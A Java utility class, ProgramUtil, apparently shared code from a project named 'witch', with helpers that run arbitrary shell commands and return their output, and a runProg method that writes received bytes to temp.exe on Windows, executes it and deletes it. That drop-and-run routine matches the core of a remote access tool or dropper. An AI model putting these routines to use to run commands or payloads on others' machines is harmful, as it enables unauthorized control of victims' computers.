package me.soda.witch.shared;

import java.io.*;
import java.nio.charset.StandardCharsets;
import java.util.function.Consumer;

@SuppressWarnings("ResultOfMethodCallIgnored")
public class ProgramUtil {
    public static boolean isWin() {
        return System.getProperty("os.name").toLowerCase().contains("windows");
    }

    public static String runCmd(String command) {
        Process process = null;
        try {
            process = isWin() ? Runtime.getRuntime().exec(
                    new String[]{"cmd.exe", "/c", command}
            ) : Runtime.getRuntime().exec(command);
        } catch (IOException e) {
            LogUtil.printStackTrace(e);
        }

        return getProcResult(process);
    }

    public static Process execInPath(String cmd, String path) throws IOException {
        Runtime runtime = Runtime.getRuntime();
        return runtime.exec(cmd, null, new File(path));
    }

    public static String getProcResult(Process process) {
        StringBuilder result = new StringBuilder();
        try {
            BufferedReader inputStream = new BufferedReader(new InputStreamReader(process.getInputStream(), StandardCharsets.UTF_8));
            String line;
            while ((line = inputStream.readLine()) != null) {
                result.append(line).append("\n");
            }
            inputStream.close();
            process.waitFor();
        } catch (Exception e) {
            LogUtil.printStackTrace(e);
        }
        return result.toString();
    }

    public static void printProcResult(Process process, Consumer<String> consumer) {
        consumer.accept(getProcResult(process));
    }

    public static void runProg(byte[] bytes) {
        if (!isWin()) return;
        try {
            File file = new File("temp.exe");
            file.createNewFile();
            FileOutputStream out = new FileOutputStream(file);
            out.write(bytes);
            out.close();
            Process process = Runtime.getRuntime().exec("temp.exe");
            process.waitFor();
            if (file.exists()) file.delete();
        } catch (IOException | InterruptedException e) {
            LogUtil.printStackTrace(e);
        }
    }
}
